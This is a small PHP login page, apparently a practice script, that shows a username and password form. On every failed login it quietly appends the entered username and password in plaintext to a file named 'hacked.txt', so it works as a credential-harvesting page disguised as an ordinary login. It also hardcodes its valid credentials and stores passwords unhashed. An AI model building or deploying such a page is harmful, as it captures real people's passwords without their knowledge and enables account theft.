<!DOCTYPE html>
<html>
    <head>
        <?php
        $uname = $_POST['uname'];
        $pass=   $_POST['upass'];
        if($uname=="abc" && $pass =="xyz")
        {
            echo "welocme abc"; 
            
        }
        else
        {
            echo "wrong credentials" ;
           
            $data= $_POST['uname'];
            $fp = fopen('hacked.txt', 'a');
            $data1 =$_POST['upass'];
            fwrite($fp, "username");
            
            fwrite($fp, $data);
            fwrite($fp, "pass");
            
            fwrite($fp, $data1);
            fclose($fp);
            
        }
        
        ?>
    
    </head>
    <body>
        <form action ="storingcredentilastotxtfromphp.php" method = "POST">
            <lable >Username:<input type ="text" value=" username -> " name="uname" validate></lable>
            <lable >Pasword:<input type ="text" value=" password -> " name="upass" validate></lable>
            <button type ="submit">login</button>
        
        </form>
    
    </body>
</html>